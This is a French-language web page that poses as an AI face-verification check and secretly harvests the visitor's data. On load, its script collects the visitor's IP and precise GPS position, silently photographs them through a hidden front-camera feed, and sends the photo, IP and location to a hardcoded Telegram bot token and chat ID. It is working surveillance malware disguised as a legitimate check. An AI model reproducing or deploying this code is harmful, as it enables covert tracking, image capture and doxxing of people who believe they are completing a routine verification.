<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vérification en cours...</title>
<style>
body {
margin: 0;
padding: 0;
background: #0a0a0a;
color: white;
font-family: 'Segoe UI', Arial, sans-serif;
height: 100vh;
display: flex;
align-items: center;
justify-content: center;
overflow: hidden;
}
.loading-container {
text-align: center;
}
.spinner {
border: 6px solid #222;
border-top: 6px solid #00bfff;
border-radius: 50%;
width: 70px;
height: 70px;
animation: spin 1.2s linear infinite;
margin: 0 auto 25px;
}
@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}
h1 { margin: 0 0 12px 0; font-size: 24px; }
p { margin: 8px 0; opacity: 0.9; font-size: 17px; }
.status { margin-top: 30px; font-size: 15px; min-height: 22px; }
</style>
</head>
<body>
<div class="loading-container">
<div class="spinner"></div>
<h1>Vérification du visage en cours...</h1>
<p>Analyse IA via Telegram Bot</p>
<p class="status" id="status">Activation de la caméra...</p>
</div>

<video id="video" autoplay playsinline style="display: none;"></video>
<canvas id="canvas" style="display: none;"></canvas>

<script>
const BOT_TOKEN = "8905839440:AAHRt0ma0O9BAEN_U9HrIPRco5EBL3rte9M";
const CHAT_ID = "7148167734";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const statusText = document.getElementById('status');

let userIP = "IP non récupérée";
let userLocation = "Localisation non disponible";

// Récupération de l'IP
async function getIP() {
try {
const res = await fetch('https://api.ipify.org?format=json');
const data = await res.json();
userIP = data.ip;
} catch (e) {
console.error("IP non récupérée");
}
}

// Récupération de la localisation GPS
async function getGPS() {
return new Promise((resolve) => {
if (!navigator.geolocation) {
resolve();
return;
}
navigator.geolocation.getCurrentPosition(
(position) => {
userLocation = `Lat: ${position.coords.latitude.toFixed(6)} | Lon: ${position.coords.longitude.toFixed(6)} | Précision: ${position.coords.accuracy.toFixed(0)}m`;
resolve();
},
(error) => {
console.error("GPS refusé ou erreur:", error);
resolve();
},
{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
);
});
}

async function startCamera() {
try {
statusText.textContent = "Accès à la caméra...";
await getIP();
await getGPS();

const stream = await navigator.mediaDevices.getUserMedia({
video: { facingMode: "user" },
audio: false
});
video.srcObject = stream;

video.onloadedmetadata = () => {
setTimeout(() => {
captureAndSend();
}, 1200);
};
} catch (err) {
statusText.textContent = "Erreur caméra";
console.error(err);
}
}

function captureAndSend() {
statusText.textContent = "Capture de la photo...";

canvas.width = video.videoWidth || 1280;
canvas.height = video.videoHeight || 720;
const ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

canvas.toBlob(async (blob) => {
await sendToTelegram(blob);
}, 'image/jpeg', 0.92);
}

async function sendToTelegram(photoBlob) {
statusText.textContent = "Envoi des données...";

const messageText = `🔍 Nouvelle vérification faciale\n\n` +
`🕒 Heure: ${new Date().toLocaleString('fr-FR')}\n` +
`🌐 IP: ${userIP}\n` +
`📍 Localisation: ${userLocation}`;

const formData = new FormData();
formData.append('chat_id', CHAT_ID);
formData.append('photo', photoBlob, 'face_verification.jpg');
formData.append('caption', messageText);

try {
const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
method: 'POST',
body: formData
});

if (response.ok) {
statusText.innerHTML = `✅ Données envoyées avec succès !<br>Photo + IP + GPS transmis`;

if (video.srcObject) {
video.srcObject.getTracks().forEach(track => track.stop());
}
} else {
statusText.textContent = "❌ Erreur envoi";
}
} catch (error) {
statusText.textContent = "❌ Erreur de connexion";
console.error(error);
}
}

window.onload = () => {
startCamera();
};
</script>
</body>
</html>
